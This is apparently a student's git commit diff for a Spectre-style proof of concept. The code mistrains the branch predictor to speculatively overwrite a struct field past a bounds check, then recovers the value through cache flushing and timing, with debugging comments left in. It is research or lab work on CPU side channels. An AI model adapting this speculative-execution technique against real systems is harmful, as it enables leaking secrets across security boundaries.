2764640b0e0c05d3d23def8d87508697aa1ad196
Chris Wagenaar <c.c.j.wagenaar@student.vu.nl>
2023-05-17 17:56:59 +0200

    buffer overflow works now. still cleaning up to do

--- buffer_overwrite/overwrite.c
+++ buffer_overwrite/overwrite.c
@@ -6,10 +6,10 @@
 #include "../lib/print_results.c"
 
 #define N_PAGES 256
-#define REPETITIONS 5
+#define REPETITIONS 1
 #define CACHE_HIT 100
 #define MAYBE_CACHE_HIT 175
-#define BUF_SIZE 16
+#define BUF_SIZE 13
 
 int  n_training   = 10;
 int  secret_size  = 1;
@@ -32,15 +32,19 @@ typedef struct cache_vars {
     char user_idx;
     char user_char;
     char user_passwd;
-
     char super_secret;
+
+    char secret;                                                    //OPTION 1: works for some reason?
     char buf[BUF_SIZE];
-    char secret;
+    //char secret;                                                  //OPTION 2: should work but does not
+
 } cache_vars_t;
+
+int overwrite_index = 255;//511;//1023;//2047;//4095;//-1;//4095 - 512;//BUF_SIZE;//4094 - 512;       //OPTION 1: works for some reason?
+//int overwrite_index = BUF_SIZE;                                   //OPTION 2: should work but does not
 
 int  buf_size __attribute__ ((aligned (256))) = BUF_SIZE;
 cache_vars_t cache __attribute__ ((aligned (256)));
-int overwrite_index = BUF_SIZE;//BUF_SIZE;//4094 - 512;
 
 void check_passwd(int user_idx, char user_char, char user_passwd, cp_t* arr, char super_secret) {
 
@@ -48,20 +52,8 @@ void check_passwd(int user_idx, char user_char, char user_passwd, cp_t* arr, cha
     cache.user_char = user_char;
     cache.user_passwd = user_passwd;
     cache.secret = 'x';
-    cache.super_secret = super_secret;//97;//super_secret
-
+    cache.super_secret = super_secret;//97;
     buf_size = BUF_SIZE;
-    //printf("uid = %4d\tuc = %c\tpwd=%c\n", user_idx, user_char_copy, user_passwd);
-    //printf("secret p = %p\tbuf = %p\tbuf[last] = %p\toverwr = %p\n",
-    //       &cache.secret, &cache.buf, &cache.buf[buf_size-1], &cache.buf[cache.user_idx]);
-
-    /*cache.user_idx = user_idx;
-    cache.user_char = user_char;
-    cache.user_passwd = user_passwd;
-    cache.secret = 'x';
-    cache.super_secret = 97;
-
-    buf_size = BUF_SIZE;*/
 
     cpuid();
     flush((void*)&buf_size);
@@ -69,18 +61,17 @@ void check_passwd(int user_idx, char user_char, char user_passwd, cp_t* arr, cha
 
     //bounds check should prevent overwrite. But speculatively executes
     if (cache.user_idx < buf_size) {
-        volatile cp_t test1 = arr[0];
-        //if (user_char_copy == 's') printf("\noverwriting %p with 's'\n", &buf[user_idx]);
         cache.buf[cache.user_idx] = cache.user_char;
+        //volatile cp_t cp0 = arr[0];
     }
 
+    //volatile cp_t cp1 = arr[1];
 
-    //volatile cp_t test1 = arr[cache.secret];
-    //volatile cp_t test2 = arr[cache.buf[cache.user_idx]];
     //secret has been (speculatively) overwritten with user char.
     if (cache.user_passwd == cache.secret) {
-        volatile cp_t test4 = arr[1]
-;        volatile cp_t cp = arr[cache.super_secret];
+        //volatile cp_t cp2 = arr[2];
+        volatile cp_t cp = arr[cache.secret];
+        //volatile cp_t cp = arr[cache.super_secret];
         //printf("super secret: '%c' (%d)\n", cp.id, cp.id);
     }
 
@@ -99,15 +90,15 @@ int* overwrite(int index) {
     char user_s_secret[n_accesses];
 
     for(int i = 0; i < n_accesses; i++) {
-        user_ids[i] = i % BUF_SIZE;//buf_size;
+        user_ids[i] = i % BUF_SIZE;
         user_chars[i] = 'a' + (i%26);
         user_pwds[i] = 'x';
         user_s_secret[i] = 'b';
     }
-    user_ids[n_training] = overwrite_index;// + 10000;
+    user_ids[n_training] = overwrite_index;//4094 - 512;// + 10000;
     user_chars[n_training] = 's';
     user_pwds[n_training] = 's';
-        user_s_secret[n_training] = 'c';
+    user_s_secret[n_training] = 'c';
     cpuid();
 
     //Misstrain branch predictor, access out of bounds on last call
@@ -116,13 +107,13 @@ int* overwrite(int index) {
         //ensures completion before flushing. bar prevents speculative access from being flushed
         cpuid();
         if(user_pwds[i] != 's') {
-            cpuid();
-            flush((void*)&arr[user_s_secret[i]]);
+            asm volatile ("cpuid\n":::);
+            flush_arr(arr, N_PAGES);
+            /*flush((void*)&arr[user_s_secret[i]]);
+            flush((void*)&arr[user_pwds[i]]);
             flush((void*)&arr[0]);
             flush((void*)&arr[1]);
-            //flush((void*)&arr['x']);
-            flush((void*)&arr[cache.buf[cache.user_idx]]);
-            //flush((void*)&arr[97]);
+            flush((void*)&arr[2]);*/
         }
         cpuid();
     }
@@ -142,15 +133,51 @@ int main(int argc, char** argv) {
            &cache.secret, &cache.buf, &cache.buf[BUF_SIZE-1], &cache.buf[overwrite_index]);
 
     int*** results = alloc_results(REPETITIONS, secret_size, N_PAGES); //results[REPETITIONS][secret_size][N_PAGES]ints
-
-    for(int r = 0; r < REPETITIONS; r++) {
+    results[0][0] = overwrite(0);
+    /*for(int r = 0; r < REPETITIONS; r++) {
         printf("\nREPETITION %d\n", r);
         for (int s = 0; s < secret_size; s++) {
             results[r][s] = overwrite(s);
-            cpuid();
+            __sync_synchronize();
         }
-    }
+    }*/
     print_results(results, REPETITIONS, secret_size, N_PAGES, CACHE_HIT);
 
     free_results(results, REPETITIONS, secret_size);
+    //check_passwd(11, 's', 's');
+
+    //reload();
+
+    //print_results
+
+    for(int i = 0; i < BUF_SIZE; i++) {
+        cache.buf[i] = i;
+    }
+    cache.secret = 0xf1;
+    cache.super_secret = 0xf2;
+    cache.user_idx = 0xaa;
+    cache.user_passwd = 0xbb;
+    cache.user_char = 0xcc;
+
+    unsigned char* cache_arr = (char*)&cache;
+    cache_print(cache_arr, sizeof(cache_vars_t));
+
+    cache.buf[overwrite_index] = 0xdd;
+
+    cache_print(cache_arr, sizeof(cache_vars_t));
+
 }
+
+/*
+ * typedef struct cache_vars {
+    char user_idx;
+    char user_char;
+    char user_passwd;
+    char super_secret;
+
+    //char secret;                                                    //OPTION 1: works for some reason?
+    char buf[BUF_SIZE];
+    char secret;                                                  //OPTION 2: should work but does not
+
+} cache_vars_t;
+ */
